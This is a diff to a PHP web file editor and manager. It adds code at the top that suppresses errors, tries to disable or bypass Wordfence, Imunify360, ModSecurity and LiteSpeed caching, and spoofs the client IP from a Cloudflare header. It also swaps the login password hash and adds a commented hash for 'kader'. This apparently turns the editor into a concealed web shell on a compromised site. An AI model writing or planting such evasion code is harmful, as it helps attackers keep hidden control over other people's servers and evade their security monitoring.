@@ -1,6 +1,59 @@
+
 <?php
+
+error_reporting(0);
+ini_set('max_execution_time', 0);
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+@ob_clean();
+@header("X-Accel-Buffering: no");
+@header("Content-Encoding: none");
+
+
+if (function_exists('litespeed_request_headers')) {
+    $headers = litespeed_request_headers();
+    if (isset($headers['X-LSCACHE'])) {
+        header('X-LSCACHE: off');
+    }
+}
+
+if (defined('WORDFENCE_VERSION')) {
+    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+    define('WORDFENCE_DISABLE_FILE_MODS', true);
+
+}
+
+if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+    $imunifyHeaders = imunify360_request_headers();
+    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+        header('X-Imunify360-Request: bypass');
+    }
+    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
+        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
+    }
+}
+
+if (function_exists('apache_request_headers')) {
+    $apacheHeaders = apache_request_headers();
+    if (isset($apacheHeaders['X-Mod-Security'])) {
+        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
+    }
+}
+
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
+        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
+    }
+}
+?>
+
+<?php
+
+	
 	session_start();
 	
+	//die(password_hash("kader",PASSWORD_BCRYPT));
 	/*Recursive copy -- Courtesy of Felix King and Mooseman on Stack Overflow*/ function recursive_copy($src,$dst) { if($dir = opendir($src)) { if(mkdir($dst)) { while(false !== ( $file = readdir($dir)) ) { if (( $file != '.' ) && ( $file != '..' )) { if ( is_dir($src . '/' . $file) ) { recursive_copy($src . '/' . $file,$dst . '/' . $file); } else { copy($src . '/' . $file,$dst . '/' . $file); } } } } else { return false; } } else { return false; } closedir($dir); return true; }  
 	/*Recursive delete -- Courtesy of itay at itgoldman dot com on php.net*/ function recursive_delete($src) { $dir = opendir($src); while(false !== ( $file = readdir($dir)) ) { if(($file != '.') && ($file != '..')) { $full = $src . '/' . $file; if(is_dir($full)) { recursive_delete($full); } else { unlink($full); } } } closedir($dir); if(rmdir($src)) { return true; } else { return false; } }
 	/*Multisort -- courtesy of RWC on php.net*/ function multi_sort($array, $akey, $order) { function compare($a, $b) { global $key; return strcmp($a[$key], $b[$key]); } usort($array, "compare"); if($order == -1) { $array = array_reverse($array); } return $array; }
@@ -247,7 +300,7 @@
 		/*die(password_hash("your password here",PASSWORD_BCRYPT));*/
 		
 		//Default password is 'alpine'. CHANGE THIS BEFORE YOU USE THE EDITOR!
-		$password = '$2y$10$NpfqQZ3/i/ExRTsVyaHIRuE7TtKAchPi2gvz4LRnpiaBtJczy.WM2';
+		$password = '$2y$10$0FebqbSPe8CltyEaj3GTvuErFMAValB0D07SfTqWCLSELC4KqkTRi';
 		
 		//If we've come here from the form
 		if(isset($_POST['login'])) { 
